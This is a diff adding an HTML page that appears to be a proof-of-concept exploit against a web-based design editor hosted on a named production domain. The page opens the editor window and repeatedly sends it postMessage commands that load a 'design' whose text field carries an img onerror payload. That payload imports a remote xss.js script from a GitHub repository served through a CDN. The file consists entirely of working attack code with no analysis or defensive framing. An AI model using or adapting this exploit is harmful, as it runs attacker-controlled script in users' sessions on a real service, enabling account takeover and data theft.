@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+</head>
+<body>
+<button onclick="openEditor()">CLICK HERE</button>
+<script>
+function openEditor() {
+  const editorWin = window.open(
+    "https://bunlayer-production.bark.com/1.0.26/editorb.html"
+  );
+  const design = {
+    counters: { u_column: 2, u_row: 2, u_content_text: 1 },
+    body: {
+      rows: [{
+        cells: [1],
+        columns: [{
+          contents: [{
+            type: "text",
+            values: {
+              text: "<img src=x onerror=import('https://cdn.jsdelivr.net/gh/mrx1w1/a@main/xss.js')>",
+              containerPadding: "10px"
+            }
+          }]
+        }]
+      }],
+      values: { contentWidth: "500px" }
+    }
+  };
+  const interval = setInterval(() => {
+    try {
+      editorWin.postMessage(
+        { action: "config", projectId: 0 },
+        "https://bunlayer-production.bark.com"
+      );
+
+      editorWin.postMessage(
+        { action: "loadDesign", design },
+        "https://bunlayer-production.bark.com"
+      );
+    } catch (e) {}
+  }, 300);
+  setTimeout(() => clearInterval(interval), 10000);
+}
+</script>
+</body>
+</html>
